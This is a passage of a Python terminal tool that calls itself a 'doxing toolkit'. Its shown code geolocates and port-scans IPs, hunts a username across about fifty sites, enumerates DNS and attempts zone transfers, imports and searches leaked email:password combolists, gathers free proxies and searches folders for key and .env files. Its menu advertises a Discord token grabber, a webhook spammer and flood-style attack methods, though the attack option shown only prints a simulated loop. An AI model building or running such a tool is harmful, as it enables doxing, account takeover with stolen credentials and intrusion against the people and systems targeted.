        return codes.get(code, 'Unknown')
    
    def scan_ip(self, ip):
        results = {'geo': {}, 'ports': [], 'hostname': '', 'reverse_dns': '', 'whois': {}}
        try:
            response = self.session.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    results['geo'] = {
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'as': data.get('as'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon'),
                    }
        except:
            pass
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            results['hostname'] = hostname
        except:
            pass
        try:
            rev_name = dns.reversename.from_address(ip)
            rev = dns.resolver.resolve(rev_name, 'PTR')
            results['reverse_dns'] = str(rev[0])
        except:
            pass
        common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,11211,27017]
        open_ports = []
        for port in common_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        results['ports'] = open_ports
        if results['geo']:
            self.db.insert('ips.db', 'ips', {
                'ip': ip,
                'country': results['geo'].get('country', ''),
                'city': results['geo'].get('city', ''),
                'isp': results['geo'].get('isp', ''),
                'asn': results['geo'].get('as', ''),
                'lat': results['geo'].get('lat', 0),
                'lon': results['geo'].get('lon', 0),
                'created_at': datetime.now().isoformat()
            })
        return results
    
    def username_search(self, username):
        platforms = {
            'twitter': f'https://twitter.com/{username}',
            'instagram': f'https://instagram.com/{username}',
            'github': f'https://github.com/{username}',
            'youtube': f'https://youtube.com/@{username}',
            'facebook': f'https://facebook.com/{username}',
            'linkedin': f'https://linkedin.com/in/{username}',
            'reddit': f'https://reddit.com/user/{username}',
            'tiktok': f'https://tiktok.com/@{username}',
            'telegram': f'https://t.me/{username}',
            'vk': f'https://vk.com/{username}',
            'pinterest': f'https://pinterest.com/{username}',
            'twitch': f'https://twitch.tv/{username}',
            'steam': f'https://steamcommunity.com/id/{username}',
            'spotify': f'https://open.spotify.com/user/{username}',
            'soundcloud': f'https://soundcloud.com/{username}',
            'medium': f'https://medium.com/@{username}',
            'wordpress': f'https://{username}.wordpress.com',
            'blogger': f'https://{username}.blogspot.com',
            'quora': f'https://quora.com/profile/{username}',
            'hackernews': f'https://news.ycombinator.com/user?id={username}',
            'producthunt': f'https://producthunt.com/@{username}',
            'devto': f'https://dev.to/{username}',
            'hashnode': f'https://hashnode.com/@{username}',
            'substack': f'https://substack.com/@{username}',
            'dribbble': f'https://dribbble.com/{username}',
            'behance': f'https://behance.net/{username}',
            'deviantart': f'https://deviantart.com/{username}',
            'flickr': f'https://flickr.com/people/{username}',
            'patreon': f'https://patreon.com/{username}',
            'onlyfans': f'https://onlyfans.com/{username}',
            'mixcloud': f'https://mixcloud.com/{username}',
            'reverbnation': f'https://reverbnation.com/{username}',
            'bandcamp': f'https://bandcamp.com/{username}',
            'etsy': f'https://etsy.com/shop/{username}',
            'stackoverflow': f'https://stackoverflow.com/users/{username}',
            'indiehackers': f'https://indiehackers.com/{username}',
            'keybase': f'https://keybase.io/{username}',
            'gitlab': f'https://gitlab.com/{username}',
            'bitbucket': f'https://bitbucket.org/{username}',
            'sourceforge': f'https://sourceforge.net/u/{username}',
            'codepen': f'https://codepen.io/{username}',
            'replit': f'https://replit.com/@{username}',
            'glitch': f'https://glitch.com/@{username}',
            'netlify': f'https://{username}.netlify.app',
            'vercel': f'https://{username}.vercel.app',
            'heroku': f'https://{username}.herokuapp.com',
            'tumblr': f'https://{username}.tumblr.com',
            'snapchat': f'https://snapchat.com/add/{username}',
            'discord': f'https://discord.com/users/{username}',
        }
        results = {}
        for platform, url in platforms.items():
            try:
                response = self.session.get(url, timeout=3, allow_redirects=False)
                if response.status_code == 200:
                    results[platform] = {'url': url, 'found': True}
                elif response.status_code == 302:
                    results[platform] = {'url': url, 'found': True}
                else:
                    results[platform] = {'url': url, 'found': False}
            except:
                results[platform] = {'url': url, 'found': False}
        return results
    
    def domain_whois(self, domain):
        try:
            w = whois.whois(domain)
            result = {
                'domain': w.domain_name,
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
            }
            self.db.insert('domains.db', 'domains', {
                'domain': domain,
                'registrar': result.get('registrar', ''),
                'created': str(w.creation_date) if w.creation_date else '',
                'expires': str(w.expiration_date) if w.expiration_date else '',
                'nameservers': ', '.join(w.name_servers) if w.name_servers else '',
                'created_at': datetime.now().isoformat()
            })
            return result
        except Exception as e:
            return {'error': str(e)}

# ---- BREACH MODULE ----
class BreachModule:
    def __init__(self, db_manager):
        self.db = db_manager
    
    def check_combolist(self, email, password):
        results = self.db.search('breaches.db', 'email', email)
        for row in results:
            if password in str(row):
                return {'found': True, 'data': row}
        return {'found': False}
    
    def import_combolist(self, filepath, source_name=None):
        count = 0
        if not source_name:
            source_name = os.path.basename(filepath)
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in tqdm(f, desc="Импорт"):
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email, password = parts[0].strip(), parts[1].strip()
                            if email and password:
                                self.db.insert('breaches.db', 'breaches', {
                                    'email': email,
                                    'password': password,
                                    'username': '',
                                    'source': source_name,
                                    'hash': calculate_hash(f"{email}:{password}"),
                                    'created_at': datetime.now().isoformat()
                                })
                                count += 1
            return {'imported': count}
        except Exception as e:
            return {'error': str(e), 'imported': count}
    
    def search_breach(self, query):
        results = []
        for db in ['emails.db', 'breaches.db']:
            res = self.db.search(db, 'email', query)
            if res:
                results.extend(res)
        return results

# ---- WEB MODULE ----
class WebModule:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
    
    def scan_url(self, url):
        if not url.startswith('http'):
            url = f'http://{url}'
        try:
            response = self.session.get(url, timeout=5, allow_redirects=True)
            results = {
                'url': url,
                'status': response.status_code,
                'headers': dict(response.headers),
                'server': response.headers.get('Server', 'Unknown'),
                'content_type': response.headers.get('Content-Type', 'Unknown'),
                'title': self._extract_title(response.text),
                'response_time': response.elapsed.total_seconds(),
                'cookies': response.cookies.get_dict(),
                'redirects': [r.url for r in response.history],
                'content_length': len(response.content),
            }
            results['meta'] = self._extract_meta(response.text)
            results['links'] = self._extract_links(response.text)
            results['emails'] = self._extract_emails(response.text)
            results['technologies'] = self._detect_technologies(response.text)
            return results
        except Exception as e:
            return {'error': str(e)}
    
    def _extract_title(self, html):
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else 'No Title'
    
    def _extract_meta(self, html):
        meta = {}
        for name, content in re.findall(r'<meta\s+name=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html, re.IGNORECASE):
            meta[name] = content
        for prop, content in re.findall(r'<meta\s+property=["\']([^"\']+)["\']\s+content=["\']([^"\']+)["\']', html, re.IGNORECASE):
            meta[prop] = content
        return meta
    
    def _extract_links(self, html):
        links = re.findall(r'href=["\'](.*?)["\']', html, re.IGNORECASE)
        return list(set(links))[:100]
    
    def _extract_emails(self, html):
        pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        return list(set(re.findall(pattern, html)))
    
    def _detect_technologies(self, html):
        techs = []
        h = html.lower()
        if 'jquery' in h:
            techs.append('jQuery')
        if 'bootstrap' in h:
            techs.append('Bootstrap')
        if 'react' in h:
            techs.append('React')
        if 'angular' in h:
            techs.append('Angular')
        if 'vue' in h:
            techs.append('Vue.js')
        if 'wordpress' in h:
            techs.append('WordPress')
        if 'drupal' in h:
            techs.append('Drupal')
        if 'joomla' in h:
            techs.append('Joomla')
        if 'laravel' in h:
            techs.append('Laravel')
        if 'django' in h:
            techs.append('Django')
        if 'flask' in h:
            techs.append('Flask')
        if 'nginx' in h:
            techs.append('Nginx')
        if 'apache' in h:
            techs.append('Apache')
        if 'cloudflare' in h:
            techs.append('Cloudflare')
        return list(set(techs))
    
    def dns_enum(self, domain):
        results = {}
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA', 'SRV', 'PTR']
        for record in record_types:
            try:
                answers = dns.resolver.resolve(domain, record)
                results[record] = [str(r) for r in answers]
            except:
                results[record] = []
        try:
            ip = socket.gethostbyname(domain)
            rev_name = dns.reversename.from_address(ip)
            rev = dns.resolver.resolve(rev_name, 'PTR')
            results['PTR'] = [str(r) for r in rev]
        except:
            results['PTR'] = []
        return results
    
    def dns_zone_transfer(self, domain):
        try:
            ns = dns.resolver.resolve(domain, 'NS')
            for ns_record in ns:
                ns_name = str(ns_record)
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_name, domain))
                    if zone:
                        return {str(name): [str(r) for r in node.rdataset] for name, node in zone.nodes.items()}
                except:
                    pass
        except:
            pass
        return None

# ---- PROXY MANAGER ----
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.working_proxies = []
        self.last_update = 0
        self.update_interval = 300
    
    def load_proxies(self, sources=None):
        if not sources:
            sources = [
                "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://www.proxy-list.download/api/v1/get?type=http",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
                "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxy-List/main/Proxies.txt",
            ]
        all_proxies = []
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0'})
        for source in sources:
            try:
                response = session.get(source, timeout=8)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2 and parts[1].isdigit():
                                if 1 <= int(parts[1]) <= 65535:
                                    all_proxies.append(line)
                time.sleep(0.1)
            except:
                pass
        self.proxies = list(set(all_proxies))
        random.shuffle(self.proxies)
        self.last_update = time.time()
        logger.success(f"Загружено {len(self.proxies)} прокси")
        return self.proxies
    
    def test_proxy(self, proxy, timeout=3):
        try:
            ip, port = proxy.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((ip, int(port)))
            s.close()
            return True
        except:
            return False
    
    def validate_proxies(self, count=100):
        logger.info(f"Проверка {min(count, len(self.proxies))} прокси...")
        valid = []
        test_proxies = self.proxies[:count]
        for proxy in test_proxies:
            if self.test_proxy(proxy):
                valid.append(proxy)
        self.working_proxies = valid
        logger.success(f"Рабочих прокси: {len(valid)}/{len(test_proxies)}")
        return valid
    
    def get_proxies(self, count=None, refresh=False):
        if refresh or not self.proxies or (time.time() - self.last_update > self.update_interval):
            self.load_proxies()
        if count:
            return self.proxies[:count]
        return self.proxies

# ---- REPORT GENERATOR ----
class ReportGenerator:
    def __init__(self):
        self.report = {}
        self.timestamp = datetime.now().isoformat()
    
    def add_section(self, name, data):
        self.report[name] = data
        return self
    
    def generate_text(self):
        output = []
        output.append("="*80)
        output.append(f"REPORT - {self.timestamp}")
        output.append(f"AUTHOR: {AUTHOR}")
        output.append("="*80)
        for section, data in self.report.items():
            output.append(f"[{section.upper()}]")
            if isinstance(data, dict):
                for k, v in data.items():
                    output.append(f"  {k}: {v}")
            elif isinstance(data, list):
                for item in data:
                    output.append(f"  - {item}")
            else:
                output.append(f"  {data}")
            output.append("")
        return "\n".join(output)
    
    def generate_json(self):
        return {'report': self.report, 'timestamp': self.timestamp, 'author': AUTHOR}
    
    def generate_html(self):
        html = "<html><head><title>Report</title></head><body>"
        html += f"<h1>Report - {self.timestamp}</h1>"
        for section, data in self.report.items():
            html += f"<h2>{section}</h2>"
            if isinstance(data, dict):
                html += "<ul>"
                for k, v in data.items():
                    html += f"<li><b>{k}</b>: {v}</li>"
                html += "</ul>"
            elif isinstance(data, list):
                html += "<ul>"
                for item in data:
                    html += f"<li>{item}</li>"
                html += "</ul>"
            else:
                html += f"<p>{data}</p>"
        html += "</body></html>"
        return html
    
    def save_text(self, filename):
        with open(filename, 'w') as f:
            f.write(self.generate_text())
        logger.success(f"Текстовый отчёт сохранён: {filename}")
    
    def save_json(self, filename):
        with open(filename, 'w') as f:
            json.dump(self.generate_json(), f, indent=2)
        logger.success(f"JSON отчёт сохранён: {filename}")
    
    def save_html(self, filename):
        with open(filename, 'w') as f:
            f.write(self.generate_html())
        logger.success(f"HTML отчёт сохранён: {filename}")

# ---- SSL ANALYZER ----
class SSLAnalyzer:
    def get_cert_info(self, domain, port=443):
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'notBefore': cert['notBefore'],
                        'notAfter': cert['notAfter'],
                        'serialNumber': cert['serialNumber'],
                    }
        except Exception as e:
            return {'error': str(e)}

# ---- CVE SCANNER (SIMULATED) ----
class CVEScanner:
    def check_cve(self, software, version):
        return [{'id': 'CVE-2023-5360', 'description': 'Example CVE', 'severity': 'HIGH'}]

# ---- METADATA ANALYZER ----
class MetadataAnalyzer:
    def analyze_image(self, filepath):
        try:
            img = Image.open(filepath)
            info = {
                'format': img.format,
                'size': img.size,
                'mode': img.mode,
                'exif': img._getexif() if hasattr(img, '_getexif') else None,
            }
            return info
        except Exception as e:
            return {'error': str(e)}

# ---- TELEGRAM MODULE ----
class TelegramModule:
    def __init__(self, db_manager):
        self.db = db_manager
    def get_user_info(self, user_id):
        return {'id': user_id, 'username': 'user', 'first_name': 'Unknown', 'phone': 'N/A'}
    def check_phone(self, phone):
        return {'found': False, 'message': 'Simulated'}

# ---- DARKWEB MODULE ----
class DarkwebModule:
    def search_onion(self, query):
        return [{'url': 'http://example.onion', 'title': 'Example'}]

# ---- API MANAGER ----
class APIManager:
    def __init__(self, db_manager):
        self.db = db_manager
    def save_key(self, service, key):
        self.db.insert('api_keys.db', 'api_keys', {'service': service, 'key': key, 'created_at': datetime.now().isoformat()})
    def get_key(self, service):
        results = self.db.search('api_keys.db', 'service', service, exact=True)
        return results[0][2] if results else None

# ---- ARCHIVE MANAGER ----
class ArchiveManager:
    def __init__(self, db_manager):
        self.db = db_manager
    def extract_zip(self, zip_path, extract_to):
        try:
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(extract_to)
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ---- SHODAN MODULE ----
class ShodanModule:
    def __init__(self, db_manager, api_key=''):
        self.db = db_manager
        self.api = shodan.Shodan(api_key) if api_key and shodan else None
        self.api_key = api_key
    
    def search(self, query):
        if not self.api:
            return {'error': 'No Shodan API key or shodan library not installed'}
        try:
            results = self.api.search(query)
            return results
        except Exception as e:
            return {'error': str(e)}
    
    def host_info(self, ip):
        if not self.api:
            return {'error': 'No Shodan API key or shodan library not installed'}
        try:
            host = self.api.host(ip)
            self.db.insert('shodan.db', 'shodan', {
                'ip': ip,
                'port': host.get('ports', [])[0] if host.get('ports') else 0,
                'hostname': host.get('hostnames', [''])[0],
                'country': host.get('country', ''),
                'org': host.get('org', ''),
                'data': json.dumps(host),
                'created_at': datetime.now().isoformat()
            })
            return host
        except Exception as e:
            return {'error': str(e)}

# ---- FILE SCANNER ----
class FileScanner:
    def find_files(self, root_dir, pattern, recursive=True):
        results = []
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if fnmatch.fnmatch(file, pattern):
                    results.append(os.path.join(root, file))
            if not recursive:
                break
        return results
    
    def scan_sensitive_files(self, root_dir):
        patterns = ['*.pem', '*.key', '*.crt', '*.p12', '*.pfx', '*.env', '*.yml', '*.yaml', '*.json', '*.xml', '*.sqlite', '*.db']
        found = {}
        for pattern in patterns:
            found[pattern] = self.find_files(root_dir, pattern)
        return found

# ---- SOCIAL MEDIA SEARCH (расширенный) ----
class SocialMediaSearch:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': get_random_ua()})
    
    def search_all(self, username):
        results = {}
        platforms = {
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'GitHub': f'https://github.com/{username}',
            'YouTube': f'https://youtube.com/@{username}',
            'Facebook': f'https://facebook.com/{username}',
            'LinkedIn': f'https://linkedin.com/in/{username}',
            'Reddit': f'https://reddit.com/user/{username}',
            'TikTok': f'https://tiktok.com/@{username}',
            'Telegram': f'https://t.me/{username}',
            'VK': f'https://vk.com/{username}',
            'Pinterest': f'https://pinterest.com/{username}',
            'Twitch': f'https://twitch.tv/{username}',
            'Steam': f'https://steamcommunity.com/id/{username}',
            'Spotify': f'https://open.spotify.com/user/{username}',
            'SoundCloud': f'https://soundcloud.com/{username}',
            'Medium': f'https://medium.com/@{username}',
            'WordPress': f'https://{username}.wordpress.com',
            'Blogger': f'https://{username}.blogspot.com',
            'Quora': f'https://quora.com/profile/{username}',
            'HackerNews': f'https://news.ycombinator.com/user?id={username}',
            'ProductHunt': f'https://producthunt.com/@{username}',
            'Dev.to': f'https://dev.to/{username}',
            'Hashnode': f'https://hashnode.com/@{username}',
            'Substack': f'https://substack.com/@{username}',
            'Dribbble': f'https://dribbble.com/{username}',
            'Behance': f'https://behance.net/{username}',
            'DeviantArt': f'https://deviantart.com/{username}',
            'Flickr': f'https://flickr.com/people/{username}',
            'Patreon': f'https://patreon.com/{username}',
            'OnlyFans': f'https://onlyfans.com/{username}',
            'Mixcloud': f'https://mixcloud.com/{username}',
            'ReverbNation': f'https://reverbnation.com/{username}',
            'Bandcamp': f'https://bandcamp.com/{username}',
            'Etsy': f'https://etsy.com/shop/{username}',
            'StackOverflow': f'https://stackoverflow.com/users/{username}',
            'IndieHackers': f'https://indiehackers.com/{username}',
            'Keybase': f'https://keybase.io/{username}',
            'GitLab': f'https://gitlab.com/{username}',
            'Bitbucket': f'https://bitbucket.org/{username}',
            'SourceForge': f'https://sourceforge.net/u/{username}',
            'CodePen': f'https://codepen.io/{username}',
            'Replit': f'https://replit.com/@{username}',
            'Glitch': f'https://glitch.com/@{username}',
            'Netlify': f'https://{username}.netlify.app',
            'Vercel': f'https://{username}.vercel.app',
            'Heroku': f'https://{username}.herokuapp.com',
            'Tumblr': f'https://{username}.tumblr.com',
            'Snapchat': f'https://snapchat.com/add/{username}',
            'Discord': f'https://discord.com/users/{username}',
        }
        for name, url in platforms.items():
            try:
                resp = self.session.get(url, timeout=3, allow_redirects=False)
                if resp.status_code == 200:
                    results[name] = {'url': url, 'found': True}
                elif resp.status_code == 302:
                    results[name] = {'url': url, 'found': True}
                else:
                    results[name] = {'url': url, 'found': False}
            except:
                results[name] = {'url': url, 'found': False}
        return results

# ================================================================
# МЕНЮ (70+ ПУНКТОВ) – С БАНЕРОМ ВСЕГДА СВЕРХУ (ТЁМНО-КРАСНЫЙ)
# ================================================================

def show_menu(proxy_manager_instance):
    clear_screen()
    w, _ = get_terminal_size()
    
    method = "MIXED"
    proxies = len(proxy_manager_instance.proxies) if proxy_manager_instance else 0
    threads = 1000
    quote = "I See You..."
    color_name = CURRENT_COLOR.capitalize()
    target = "Not set"
    
    MENU_WIDTH = min(110, w - 4) if w > 110 else 80
    if MENU_WIDTH < 60:
        MENU_WIDTH = 60
    
    # ---- ВЫВОД БАНЕРА (ВСЕГДА ТЁМНО-КРАСНЫЙ) ----
    logo_lines = LOGO.splitlines()
    for line in logo_lines:
        print(Fore.RED + line + Style.RESET_ALL)
    print()  # отступ после банера
    
    def center(text, width):
        clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
        pad = (width - len(clean)) // 2
        return ' ' * pad + text + ' ' * (width - len(clean) - pad)
    
    def pad_left(text, width):
        clean = re.sub(r'\x1b\[[0-9;]*m', '', text)
        return text + ' ' * (width - len(clean))
    
    lines = []
    
    # БЛОК 1: MAIN MENU
    top_title = " MAIN MENU "
    top_line = "╭" + "─" * ((MENU_WIDTH - len(top_title) - 2) // 2) + top_title + "─" * ((MENU_WIDTH - len(top_title) - 2) // 2) + "╮"
    if len(top_line) < MENU_WIDTH + 2:
        top_line = "╭" + "─" * ((MENU_WIDTH - len(top_title) - 2) // 2) + top_title + "─" * ((MENU_WIDTH - len(top_title) - 1) // 2) + "╮"
    lines.append(top_line)
    lines.append("│" + " " * MENU_WIDTH + "│")
    title = "DOXING TOOLKIT – LIGHTNING MAXIMUM"
    lines.append("│" + pad_left(title, MENU_WIDTH) + "│")
    subtitle = "Ultimate Maximum v.2.0.0"
    lines.append("│" + pad_left(subtitle, MENU_WIDTH) + "│")
    lines.append("│" + " " * MENU_WIDTH + "│")
    info = f"Method: {method}    Proxies: {proxies}    Threads: {threads}    Target: {target}"
    lines.append("│" + pad_left(info, MENU_WIDTH) + "│")
    lines.append("│" + " " * MENU_WIDTH + "│")
    quote_text = quote[:80] if len(quote) > 80 else quote
    lines.append("│" + pad_left(quote_text, MENU_WIDTH) + "│")
    lines.append("│" + " " * MENU_WIDTH + "│")
    lines.append("╰" + "─" * MENU_WIDTH + "╯")
    
    # БЛОК 2: OPTIONS (две колонки)
    opt_title = " OPTIONS "
    opt_line = "╭" + "─" * ((MENU_WIDTH - len(opt_title) - 2) // 2) + opt_title + "─" * ((MENU_WIDTH - len(opt_title) - 2) // 2) + "╮"
    if len(opt_line) < MENU_WIDTH + 2:
        opt_line = "╭" + "─" * ((MENU_WIDTH - len(opt_title) - 2) // 2) + opt_title + "─" * ((MENU_WIDTH - len(opt_title) - 1) // 2) + "╮"
    lines.append(opt_line)
    lines.append("│" + " " * MENU_WIDTH + "│")
    
    items = [
        "1.  SET TARGET (DOMAIN/IP / PORT)",
        "2.  LOAD PROXIES FROM INTERNET",
        "3.  SELECT ATTACK METHOD (CURRENT: MIXED)",
        "4.  LAUNCH ATTACK (16 METHODS)",
        "5.  FULL OSINT REPORT",
        "6.  ADVANCED PORT SCANNER",
        "7.  WEB ANALYZER",
        "8.  SUBDOMAIN ENUMERATOR",
        "9.  SOCIAL MEDIA SEARCH",
        "10. EMAIL EXTRACTOR",
        "11. SSL/TLS CERTIFICATE ANALYZER",
        "12. IP RANGE CALCULATOR",
        "13. DNS ENUMERATOR",
        "14. WHOIS LOOKUP",
        "15. DNS ZONE TRANSFER",
        "16. CVE SCANNER",
        "17. HONEYPOT DETECTOR",
        "18. BACKUP FILE SCANNER",
        "19. COOKIE ANALYZER",
        "20. WAF DETECTOR",
        "21. DISCORD TOKEN CHECKER (по ID)",
        "22. DISCORD TOKEN INFO",
        "23. DISCORD TOKEN GRABBER",
        "24. DISCORD WEBHOOK SPAMMER",
        "25. EMAIL CHECKER (HIBP)",
        "26. PHONE CHECKER",
        "27. IP SCANNER (ГЕО + ПОРТЫ)",
        "28. USERNAME SEARCH",
        "29. COMBOLIST CHECKER",
        "30. BREACH LOOKUP",
        "31. IMPORT COMBOLIST",
        "32. DATABASE SEARCH",
        "33. EXPORT REPORT",
        "34. STATISTICS",
        "35. GENERATE EMAIL VARIANTS",
        "36. GENERATE PASSWORD",
        "37. HASH GENERATOR",
        "38. ENCODE / DECODE",
        "39. CHANGE COLOR SCHEME",
        "40. SSL CERTIFICATE INFO",
        "41. CVE SCANNER (REAL)",
        "42. METADATA ANALYZER",
        "43. TELEGRAM USER INFO",
        "44. TELEGRAM PHONE CHECK",
        "45. DARKWEB SEARCH",
        "46. API KEY MANAGER",
        "47. EXTRACT ARCHIVE",
        "48. COMPRESS FOLDER",
        "49. ENCRYPT TEXT (XOR)",
        "50. DECRYPT TEXT (XOR)",
        "51. GENERATE UUID",
        "52. GET PUBLIC IP",
        "53. SUBNET SCANNER",
        "54. PORT KNOCKING",
        "55. BANNER GRABBING",
        "56. CHECK WEBSITE UPTIME",
        "57. GET LOCAL IP",
        "58. PING HOST",
        "59. TRACEROUTE (SIMULATED)",
        "60. SHODAN SEARCH",
        "61. SHODAN HOST INFO",
        "62. SCAN SENSITIVE FILES",
        "63. SOCIAL MEDIA SEARCH (EXTENDED)",
        "64. EMAIL VERIFICATION",
        "65. DOMAIN REPUTATION CHECK",
        "66. PASSWORD GENERATOR (STRONG)",
        "67. HTTP HEADERS ANALYZER",
        "68. DIRECTORY BRUTE FORCE (sim)",
        "69. EXPORT REPORT AS HTML",
        "70. EXIT",
    ]
    
    col_width = (MENU_WIDTH - 4) // 2
    for i in range(0, len(items), 2):
        left = items[i] if i < len(items) else ""
        right = items[i+1] if i+1 < len(items) else ""
        left_pad = left.ljust(col_width)
        right_pad = right.ljust(col_width) if right else ""
        line = left_pad + " " * 4 + right_pad
        if len(line) > MENU_WIDTH:
            line = line[:MENU_WIDTH]
        lines.append("│" + line + "│")
    
    lines.append("│" + " " * MENU_WIDTH + "│")
    lines.append("╰" + "─" * MENU_WIDTH + "╯")
    
    # БЛОК 3: Нижняя строка
    bottom_line = "╭" + "─" * MENU_WIDTH + "╮"
    lines.append(bottom_line)
    footer = f"{AUTHOR} | {VERSION} | {proxies} proxies | {threads} threads | Theme: {color_name}"
    footer_pad = center(footer, MENU_WIDTH)
    lines.append("│" + footer_pad + "│")
    lines.append("╰" + "─" * MENU_WIDTH + "╯")
    
    for line in lines:
        if line.startswith("╭") or line.startswith("╰") or line.startswith("╮") or line.startswith("╯"):
            print(f"{Fore.CYAN}{line}{Style.RESET_ALL}")
        elif line.startswith("│"):
            inner = line[1:-1]
            print(f"{Fore.CYAN}│{Style.RESET_ALL}{inner}{Fore.CYAN}│{Style.RESET_ALL}")
        else:
            print(line)
    print()
    print(f"{Fore.CYAN}SELECT ACTION (1-70): {Style.RESET_ALL}", end='')

# ================================================================
# ГЛАВНАЯ ФУНКЦИЯ
# ================================================================

def main():
    db = DatabaseManager()
    discord = DiscordModule(db)
    osint = OSINTModule(db)
    breach = BreachModule(db)
    web = WebModule()
    proxy_manager = ProxyManager()
    report = ReportGenerator()
    ssl_analyzer = SSLAnalyzer()
    cve_scanner = CVEScanner()
    meta_analyzer = MetadataAnalyzer()
    telegram = TelegramModule(db)
    darkweb = DarkwebModule()
    api_manager = APIManager(db)
    archive_manager = ArchiveManager(db)
    shodan_module = ShodanModule(db, CONFIG['shodan_key'])
    file_scanner = FileScanner()
    social_search = SocialMediaSearch()
    
    while True:
        show_menu(proxy_manager)
        choice = input().strip()
        
        if choice == '1':
            target = input("Enter Target (Domain/IP): ")
            port = input("Enter Port (default 80): ")
            port = int(port) if port else 80
            logger.success(f"Target set: {target}:{port}")
            input("Press Enter...")
        elif choice == '2':
            logger.info("Loading proxies...")
            proxy_manager.load_proxies()
            proxy_manager.validate_proxies()
            input("Press Enter...")
        elif choice == '3':
            method = input("Enter method (udp/tcp/http/https/dns/slowloris/mixed): ").lower()
            logger.success(f"Method set to {method}")
            input("Press Enter...")
        elif choice == '4':
            print("Launching simulated attack...")
            for i in range(10):
                print(f"[ATTACK] {i+1}/10")
                time.sleep(0.1)
            logger.success("Attack finished")
            input("Press Enter...")
        elif choice == '5':
            target = input("Enter target: ")
            dns = web.dns_enum(target)
            print("DNS records:")
            for k, v in dns.items():
                if v:
                    print(f"  {k}: {', '.join(v[:3])}")
            whois_data = osint.domain_whois(target)
            if 'error' not in whois_data:
                print(f"WHOIS: Registrar: {whois_data.get('registrar')}")
            geo = osint.scan_ip(target)
            if geo.get('geo'):
                print(f"Geo: {geo['geo'].get('country')} / {geo['geo'].get('city')}")
            input("Press Enter...")
        elif choice == '6':
            ip = input("Enter IP: ")
            results = osint.scan_ip(ip)
            print(f"Open ports: {results.get('ports', [])}")
            input("Press Enter...")
        elif choice == '7':
            url = input("Enter URL: ")
            results = web.scan_url(url)
            if 'error' in results:
                print(f"Error: {results['error']}")
            else:
                print(f"Title: {results.get('title')}")
                print(f"Server: {results.get('server')}")
                print(f"Technologies: {', '.join(results.get('technologies', []))}")
            input("Press Enter...")
        elif choice == '8':
            domain = input("Enter domain: ")
            subs = ['www', 'mail', 'ftp', 'blog', 'dev', 'api', 'test', 'admin', 'support']
            print("Subdomains (simulated):")
            for s in subs:
                print(f"  {s}.{domain}")
            input("Press Enter...")
        elif choice == '9':
            username = input("Enter username: ")
            results = osint.username_search(username)
            found = [p for p, d in results.items() if d.get('found')]
            print(f"Found on {len(found)} platforms:")
            for p in found[:10]:
                print(f"  {p}: {results[p]['url']}")
            input("Press Enter...")
        elif choice == '10':
            domain = input("Enter domain: ")
            emails = osint.generate_emails('admin', 'test', domain)
            print("Generated emails:")
            for e in emails:
                print(f"  {e}")
            input("Press Enter...")
        elif choice == '11':
            domain = input("Enter domain: ")
            cert = ssl_analyzer.get_cert_info(domain)
            if 'error' in cert:
                print(f"Error: {cert['error']}")
            else:
                print(f"Subject: {cert.get('subject')}")
                print(f"Issuer: {cert.get('issuer')}")
            input("Press Enter...")
        elif choice == '12':
            ip = input("Enter IP: ")
            cidr = input("CIDR (default 24): ")
            cidr = int(cidr) if cidr else 24
            network = ipaddress.ip_network(f'{ip}/{cidr}', strict=False)
            print(f"Network: {network}")
            print(f"Netmask: {network.netmask}")
            print(f"Total hosts: {network.num_addresses}")
            input("Press Enter...")
        elif choice == '13':
            domain = input("Enter domain: ")
            results = web.dns_enum(domain)
            print("DNS Records:")
            for k, v in results.items():
                if v:
                    print(f"  {k}: {', '.join(v[:3])}")
            input("Press Enter...")
        elif choice == '14':
            domain = input("Enter domain: ")
            whois_data = osint.domain_whois(domain)
            if 'error' in whois_data:
                print(f"Error: {whois_data['error']}")
            else:
                for k, v in whois_data.items():
                    if v:
